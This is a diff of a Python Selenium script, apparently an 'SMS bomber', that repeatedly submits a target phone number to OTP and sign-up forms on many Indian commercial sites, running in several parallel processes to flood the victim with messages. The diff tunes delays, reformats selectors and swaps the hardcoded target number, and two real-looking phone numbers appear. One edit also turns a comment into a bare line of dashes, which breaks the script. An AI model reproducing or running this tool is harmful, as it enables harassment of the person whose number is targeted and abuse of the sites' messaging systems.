@@ -6,7 +6,7 @@ import  random
 import os
 import multiprocessing
 
-# -------------------------     USING ARGUMENTS     ----------------------
+-------------------------     USING ARGUMENTS     ----------------------
 import argparse
 my_parser = argparse.ArgumentParser(description='give the mobile number and the sms number')
 my_parser.add_argument('mn', metavar='mn',type=str, help='Mobile Number')
@@ -42,7 +42,7 @@ browser = webdriver.Chrome(executable_path=os.environ.get("CHROMEDRIVER_PATH"),o
 def myupchar(num):
     try:
         browser.get('https://www.myupchar.com/users/sign_up')
-
+        time.sleep(4)
         number = browser.find_element_by_id('Phone-number').send_keys(num)
         time.sleep(2)
         browser.find_element_by_id("send-otp").click()
@@ -55,7 +55,7 @@ def myupchar(num):
 def pizzahut(num):
     try:
         browser.get('https://www.pizzahut.co.in/account/otp')
-
+        time.sleep(4)
         number = browser.find_element_by_id('phone-field').send_keys(num)
         time.sleep(2)
         browser.find_element_by_xpath("//*[@id='app']/div/div[2]/div/form/button").click()
@@ -67,9 +67,9 @@ def pizzahut(num):
 def unacademy(num):
     try:
         browser.get('https://unacademy.com/')
-
+        time.sleep(4)
         browser.find_element_by_xpath("//*[@id='__next']/header/div/button").click()
-
+        time.sleep(4)
         browser.find_element_by_xpath('//*[@id="DrawerPaper"]/div[2]/div[1]/div[2]/div/input').send_keys(num)
         time.sleep(2)
         browser.find_element_by_xpath('//*[@id="DrawerPaper"]/div[2]/div[1]/div[3]/button').click()
@@ -82,16 +82,11 @@ def unacademy(num):
 def dominos(num):
     try:
         browser.get('https://pizzaonline.dominos.co.in/')
-
+        time.sleep(4)
         browser.find_element_by_xpath('//*[@id="__next"]/div/div[1]/div[1]/div/div[3]/div[2]/div[1]/div[2]').click()
-
-        time.sleep(2)
-        browser.find_element_by_xpath(
-            '//*[@id="__next"]/div/div[1]/div[1]/div/div[3]/div[2]/div[2]/div/div[3]/div/div/div/div[2]/div/form/div[1]/div[2]/input').send_keys(
-            num)
-
-        browser.find_element_by_xpath(
-            '//*[@id="__next"]/div/div[1]/div[1]/div/div[3]/div[2]/div[2]/div/div[3]/div/div/div/div[2]/div/form/div[2]/input').click()
+        time.sleep(3)
+        browser.find_element_by_xpath('//*[@id="__next"]/div/div[1]/div[1]/div/div[3]/div[2]/div[2]/div/div[3]/div/div/div/div[2]/div/form/div[1]/div[2]/input').send_keys(num)
+        browser.find_element_by_xpath('//*[@id="__next"]/div/div[1]/div[1]/div/div[3]/div[2]/div[2]/div/div[3]/div/div/div/div[2]/div/form/div[2]/input').click()
         time.sleep(2)
         print("dominos send")
     except:
@@ -102,14 +97,10 @@ def dominos(num):
 def medlife(num):
     try:
         browser.get('https://www.medlife.com/Login')
-
-        browser.find_element_by_xpath(
-            '//*[@id="__next"]/div[2]/div[1]/div[1]/div/div[1]/form/div[1]/div/button[2]').click()
-
-        time.sleep(2)
-        browser.find_element_by_xpath(
-            '//*[@id="__next"]/div[2]/div[1]/div[1]/div/div[1]/form/div[2]/div[1]/input').send_keys(num)
-
+        time.sleep(4)
+        browser.find_element_by_xpath('//*[@id="__next"]/div[2]/div[1]/div[1]/div/div[1]/form/div[1]/div/button[2]').click()
+        time.sleep(3)
+        browser.find_element_by_xpath('//*[@id="__next"]/div[2]/div[1]/div[1]/div/div[1]/form/div[2]/div[1]/input').send_keys(num)
         browser.find_element_by_xpath('//*[@id="__next"]/div[2]/div[1]/div[1]/div/div[1]/form/div[3]/button').click()
         time.sleep(2)
         print("medlife ok")
@@ -121,23 +112,14 @@ def medlife(num):
 def lybrate(num):
     try:
         browser.get('https://www.lybrate.com/login?lpt=HOME')
-
+        time.sleep(4)
         browser.find_element_by_xpath('/html/body/div[2]/div/div/div[2]/md-card/ul/li[2]/a').click()
-
-        time.sleep(2)
-        browser.find_element_by_xpath(
-            '/html/body/div[2]/div/div/div[2]/md-card/div/div/form/div/div/div[1]/input').send_keys("dfhvbfhhkdv")
-        browser.find_element_by_xpath(
-            '/html/body/div[2]/div/div/div[2]/md-card/div/div/form/div/div/div[2]/div[2]/span/input').send_keys(
-            num)
-        browser.find_element_by_xpath(
-            '/html/body/div[2]/div/div/div[2]/md-card/div/div/form/div/div/div[3]/input').send_keys("8fvuvh@frfrhf")
-        browser.find_element_by_xpath(
-            '/html/body/div[2]/div/div/div[2]/md-card/div/div/form/div/div/div[4]/input').send_keys(
-            "fbvfhvhfvbfhvfvbhfvbfhvb@gmail.com")
-
-        browser.find_element_by_xpath(
-            '/html/body/div[2]/div/div/div[2]/md-card/div/div/form/div/section/button').click()
+        time.sleep(3)
+        browser.find_element_by_xpath('/html/body/div[2]/div/div/div[2]/md-card/div/div/form/div/div/div[1]/input').send_keys("dfhvbfhhkdv")
+        browser.find_element_by_xpath('/html/body/div[2]/div/div/div[2]/md-card/div/div/form/div/div/div[2]/div[2]/span/input').send_keys(num)
+        browser.find_element_by_xpath('/html/body/div[2]/div/div/div[2]/md-card/div/div/form/div/div/div[3]/input').send_keys("8fvuvh@frfrhf")
+        browser.find_element_by_xpath('/html/body/div[2]/div/div/div[2]/md-card/div/div/form/div/div/div[4]/input').send_keys("fbvfhvhfvbfhvfvbhfvbfhvb@gmail.com")
+        browser.find_element_by_xpath('/html/body/div[2]/div/div/div[2]/md-card/div/div/form/div/section/button').click()
         time.sleep(2)
         print("lybrate ok")
     except:
@@ -149,14 +131,10 @@ def lybrate(num):
 def netmeds(num):
     try:
         browser.get('https://www.netmeds.com/customer/account/login')
-        #
-        # browser.find_element_by_xpath('//*[@id="__next"]/div[2]/div[1]/div[1]/div/div[1]/form/div[1]/div/button[2]').click()
-        #
-        time.sleep(2)
+        time.sleep(4)
         browser.find_element_by_xpath('//*[@id="loginfirst_mobileno"]').send_keys(num)
-
-        browser.find_element_by_xpath(
-            '//*[@id="app"]/main/app-login/div[1]/div/div[1]/div[2]/div/div[1]/form/div[2]/button[2]').click()
+        browser.find_element_by_xpath('//*[@id="app"]/main/app-login/div[1]/div/div[1]/div[2]/div/div[1]/form/div[2]/button[2]').click()
+        time.sleep(2)
         print("netmeds ok")
     except:
         print("netmeds failed")
@@ -166,17 +144,15 @@ def netmeds(num):
 def swigy(num):
     try:
         browser.get('https://www.swiggy.com/')
-
+        time.sleep(4)
         browser.find_element_by_xpath('//*[@id="root"]/div[1]/div[1]/div/div[1]/div[1]/div/div[1]/div/a[2]').click()
-
-        time.sleep(2)
+        time.sleep(3)
         browser.find_element_by_xpath('//*[@id="mobile"]').send_keys(num)
         browser.find_element_by_xpath('//*[@id="name"]').send_keys("hudfhvudhdfhdfvhfuvhfvhdfv")
         browser.find_element_by_xpath('//*[@id="password"]').send_keys("8fvuvh@frfrhf")
         browser.find_element_by_xpath('//*[@id="email"]').send_keys("fbvfhvhfvbfhvfvbhfvbfhvb@gmail.com")
 
-        browser.find_element_by_xpath(
-            '//*[@id="overlay-sidebar-root"]/div/div/div[2]/div/div/div/div[2]/form/div[3]/a').click()
+        browser.find_element_by_xpath('//*[@id="overlay-sidebar-root"]/div/div/div[2]/div/div/div/div[2]/form/div[3]/a').click()
         time.sleep(2)
         print("swigy ok")
     except:
@@ -185,15 +161,10 @@ def swigy(num):
 def housing(num):
     try:
         browser.get('https://housing.com/')
-        #
-        # browser.find_element_by_xpath('//*[@id="__next"]/div[2]/div[1]/div[1]/div/div[1]/form/div[1]/div/button[2]').click()
-        #
-        time.sleep(2)
+        time.sleep(4)
         browser.find_element_by_xpath('//*[@id="app"]/div[1]/header/div/div').click()
-        time.sleep(2)
-
+        time.sleep(3)
         browser.find_element_by_xpath('//*[@id="app"]/div[1]/div[2]/div[2]/div[2]/div[2]/form/div/div/input').send_keys(num)
-
         browser.find_element_by_xpath('//*[@id="app"]/div[1]/div[2]/div[2]/div[2]/div[2]/form/button').click()
         time.sleep(2)
 
@@ -204,15 +175,10 @@ def housing(num):
 def dunzo(num):
     try:
         browser.get('https://www.dunzo.com/')
-        #
-        # browser.find_element_by_xpath('//*[@id="__next"]/div[2]/div[1]/div[1]/div/div[1]/form/div[1]/div/button[2]').click()
-        #
-        time.sleep(2)
+        time.sleep(4)
         browser.find_element_by_xpath('//*[@id="header"]/div/div/div/div[3]/div/p').click()
-        time.sleep(2)
-
+        time.sleep(3)
         browser.find_element_by_xpath('//*[@id="modal"]/div/div[2]/div/div/div/div/div/div/input').send_keys(num)
-
         browser.find_element_by_xpath('//*[@id="modal"]/div/div[2]/div/div/div/div/div/div/div[2]/button').click()
         time.sleep(2)
 
@@ -223,16 +189,12 @@ def dunzo(num):
 def justdial(num):
     try:
         browser.get('https://www.justdial.com/')
-        #
-        # browser.find_element_by_xpath('//*[@id="__next"]/div[2]/div[1]/div[1]/div/div[1]/form/div[1]/div/button[2]').click()
-        #
-        time.sleep(2)
-        browser.find_element_by_xpath('//*[@id="h_login"]').click()
-        time.sleep(2)
 
+        time.sleep(4)
+        browser.find_element_by_xpath('//*[@id="h_login"]').click()
+        time.sleep(3)
         browser.find_element_by_xpath('//*[@id="lgn_name"]').send_keys("ghgdjfdff")
         browser.find_element_by_xpath('//*[@id="lgn_mob"]').send_keys(num)
-
         browser.find_element_by_xpath('//*[@id="lgn_smtn"]').click()
         time.sleep(2)
 
@@ -243,17 +205,14 @@ def justdial(num):
 def housejoy(num):
     try:
         browser.get('https://www.housejoy.in/')
-        #
-        # browser.find_element_by_xpath('//*[@id="__next"]/div[2]/div[1]/div[1]/div/div[1]/form/div[1]/div/button[2]').click()
-        #
-        time.sleep(2)
+        time.sleep(4)
         try:
             browser.find_element_by_xpath('//*[@id="locationPopModal"]/div/div[3]/img').click()
         except:
             pass
         time.sleep(2)
         browser.find_element_by_xpath('//*[@id="top-head-height"]/div/nav/div[1]/div/div[3]/ul/li[3]/div').click()
-        time.sleep(2)
+        time.sleep(3)
         browser.find_element_by_xpath('//*[@id="loginModal"]/div/div/div[2]/div/div[1]/div/div/input').send_keys(num)
 
         browser.find_element_by_xpath('//*[@id="loginModal"]/div/div/div[2]/div/div[2]/div[1]/div').click()
@@ -267,11 +226,9 @@ def filpkart(num):
     try:
         browser.get('https://www.flipkart.com/')
 
+        time.sleep(4)
+        browser.find_element_by_xpath('/html/body/div[2]/div/div/div/div/div[2]/div/form/div[1]/input').send_keys(num)
         time.sleep(3)
-        browser.find_element_by_xpath('/html/body/div[2]/div/div/div/div/div[2]/div/form/div[1]/input').send_keys(
-            num)
-        time.sleep(2)
-
         browser.find_element_by_xpath('/html/body/div[2]/div/div/div/div/div[2]/div/form/div[4]/button').click()
         time.sleep(2)
         print("filipkart ok")
@@ -431,7 +388,7 @@ funclist = [swigy,myupchar,pizzahut,dominos,unacademy,medlife,lybrate,netmeds,ho
 def bomb():
     for i in range(20):
         sf = random.choice(funclist)
-        sf("8171247161")
+        sf("7668165683")
 
 
 
@@ -440,19 +397,19 @@ if __name__ == "__main__":
     t2 = multiprocessing.Process(target=bomb)
     t3 = multiprocessing.Process(target=bomb)
     t4 = multiprocessing.Process(target=bomb)
-    t5 = multiprocessing.Process(target=bomb)
-    t6 = multiprocessing.Process(target=bomb)
-    t7 = multiprocessing.Process(target=bomb)
-    t8 = multiprocessing.Process(target=bomb)
+    # t5 = multiprocessing.Process(target=bomb)
+    # t6 = multiprocessing.Process(target=bomb)
+    # t7 = multiprocessing.Process(target=bomb)
+    # t8 = multiprocessing.Process(target=bomb)
 
     t1.start()
     t2.start()
     t3.start()
     t4.start()
-    t5.start()
-    t6.start()
-    t7.start()
-    t8.start()
+    # t5.start()
+    # t6.start()
+    # t7.start()
+    # t8.start()
 
 
 
@@ -463,10 +420,3 @@ if __name__ == "__main__":
 
 
 # ---------------------------------------------------------------END  SCRIPT -----------------------------------------------------------
-
-
-
-
-
-
-
